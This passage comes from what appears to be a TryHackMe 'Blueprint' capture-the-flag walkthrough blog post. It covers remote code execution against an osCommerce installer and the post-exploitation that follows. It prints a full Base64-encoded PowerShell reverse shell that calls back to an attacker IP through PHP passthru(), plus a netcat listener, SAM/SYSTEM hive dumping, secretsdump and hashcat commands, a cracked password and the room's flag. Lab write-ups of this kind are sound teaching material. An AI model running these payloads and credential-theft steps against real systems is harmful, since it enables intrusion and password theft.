+With passthru() confirmed working, I crafted the final payload. To avoid character escaping issues, I Base64-encoded a standard PowerShell TCP reverse shell script connecting back to my attacker machine (10.23.72.235) on port 9001. The PHP execution looked like this:
+
+// Payload Part in Python (Dynamically generate Base64 for clarity):
+attacker_ip = “10.23.72.235”
+attacker_port = “9001”
+ps_command_template = f’$client=New-Object System.Net.Sockets.TCPClient(“{attacker_ip}”,{attacker_port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + “PS “+(pwd).Path+”> “;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()’
+import base64
+powershell_rev_shell_base64 = base64.b64encode(ps_command_template.encode(‘utf-16-le’)).decode()
+payload = ‘\’);’
+payload += ‘passthru(“powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand ‘ + powershell_rev_shell_base64 + ‘“);’
+payload += ‘//’
+I set up a listener on 10.23.72.235.
+nc -lvnp 9001
+Triggering the payload
+by visiting http://10.10.199.204:8080/oscommerce-2.3.4/catalog/install/includes/configure.php successfully connected the reverse shell back to my listener, granting me a shell as NT AUTHORITY\SYSTEM!
+
+Press enter or click to view image in full size
+
+reverse shell
+Phase 3: Privilege Escalation — Already Rooted!
+No privilege escalation needed!
+
+Get jensbecker-dev’s stories in your inbox
+Join Medium for free to get updates from this writer.
+
+Enter your email
+Subscribe
+The initial exploit landed us directly as the highest privilege user on the system.
+
+Phase 4: Claiming the Spoils — Flags Acquisition
+With SYSTEM access, finding the flags was the next objective.
+
+A. Decrypting “Lab” User NTLM Hash
+Dumping Registry Hives
+Accessing password hashes requires the SAM and SYSTEM registry hives. Using the built-in reg.exe tool, I saved copies from the privileged shell (saving to the web directory for easy download):
+
+reg save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\sam.save
+reg save hklm\system C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\system.save
+Extracting Hashes
+I downloaded sam.save and system.save via the webserver (http://10.10.199.204:8080/...) and used Impacket’s secretsdump.py locally on my attacker machine:
+
+secretsdump.py -sam sam.save -system system.save LOCAL
+This extracted the hashes, including the one for the user “Lab”:
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+Cracking the Hash
+The NTLM hash 30e87bf999828446a1c1209ddde4c450 needed cracking.
+
+hashcat -m 1000 lab_hash.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt
+Press enter or click to view image in full size
+
+We cracked it!
+Decrypted Hash:
+
+30e87bf999828446a1c1209ddde4c450
+googleplus
+B. Locating root.txt
+A quick search on the Administrator’s desktop using PowerShell revealed the final flag:
+
+PS C:\…> ls C:\Users\Administrator\Desktop
+
+Press enter or click to view image in full size
+
+Output showed root.txt.txt. Note the double extension!
+
+Reading the flag:
+
+PS C:\…> Get-Content C:\Users\Administrator\Desktop\root.txt.txt
+
+Press enter or click to view image in full size
+
+THM{pea13ce6f8e7882e18cea833e809b0ce}
+Phase 5: Conclusion — Blueprint Demystified
+Blueprint was a solid CTF experience highlighting critical real-world vulnerabilities:
+
+Insecure Installation Defaults: Failing to remove installation files is a recipe for disaster.
+Insufficient PHP Hardening: Relying solely on disabling system() is ineffective if functions like passthru() remain enabled.
+Attention to Detail: Small syntax errors (like comment types) or OS differences can block exploits. Troubleshooting is key.
+Post-Exploitation Techniques: Knowing how to extract credentials (SAM/SYSTEM dump) even with high privileges is essential.
+Tools Recap
+Nmap: Initial discovery.
+Python3 (requests): Scripting the osCommerce RCE.
+Netcat (nc): Catching the reverse shell.
+Impacket (secretsdump.py): Hash extraction.
+CrackStation / Hashcat / John: Password cracking.
+PowerShell: Target interaction & file system navigation.
+Thanks for reading! I hope this detailed walkthrough helps you conquer the Blueprint room on TryHackMe or provides valuable insights into web application security and Windows post-exploitation. Happy hacking!
